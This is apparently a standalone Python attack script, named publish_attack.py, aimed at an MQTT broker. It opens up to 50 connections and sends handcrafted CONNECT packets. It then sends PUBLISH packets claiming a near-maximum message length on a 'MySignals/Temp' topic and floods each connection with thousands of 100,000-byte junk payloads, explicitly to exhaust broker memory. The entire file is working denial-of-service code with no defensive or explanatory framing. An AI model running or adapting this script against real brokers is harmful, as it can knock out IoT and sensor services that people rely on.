#!/usr/bin/python3

import socket               # Import socket module
import sys

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():

    if(len(sys.argv) != 3):
        print('error, sample invocation is: $python3 publish_attack.py <broker_address> <port>')
        sys.exit(-1)

    host_specified = sys.argv[1]            # Broker Address.
    port_specified = sys.argv[2]            # Broker Port.
    bogus_payload = bytearray(100000)       # Sizeable Payload To Send

    # Connect Packet Structure
    #   Reserved
    #   Message Length
    #   Protocol Name Length
    #   Protocol Name
    #   Version
    #   Reserved
    #   Keep-Alive
    #   Client ID
    connect_payload = b'\x10' \
                      b'\x0c' \
                      b'\x00\x04' \
                      b'\x4d\x51\x54\x54' \
                      b'\x04' \
                      b'\x02' \
                      b'\x00\x3c' \
                      b'\x00\x00'

    # Publish Packet Structure
    #   Retain
    #   Message Length
    #   Topic Length
    #   Topic
    #   Message - Max = 268435439
    publish_payload = b'\x30' \
                      b'\xff\xff\xff\x7f' \
                      b'\x00\x0e' \
                      b'MySignals/Temp' \
                      b'19.09'

    sockets = []     # Sockets for connecting to broker
    connections = [] # Valid socket connections for sending the payloads

    # Open sockets
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)  # Create a socket object
            sockets.append(s)
        except:
            continue

    # Connect to broker server with 3-way handshake
    for s in sockets:
        try:
            s.connect((host_specified, port_specified))
            connections.append(s)
        except:
            continue

    # Create broker connections for each successful socket
    for c in connections:
        try:
            c.send(connect_payload)
        except:
            continue

    # Send publish packets for each successful socket
    for c in connections:
        try:
            c.send(publish_payload)
        except:
            continue

    # Send bogus payloads to fill up broker memory
    print()
    print('sending payloads')

    for i in range(2680):
        for c in connections:
            try:
                c.send(bogus_payload)
            except:
                continue

    print('payloads finished')

# -----------------------------------------------------------------------------
#
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    main()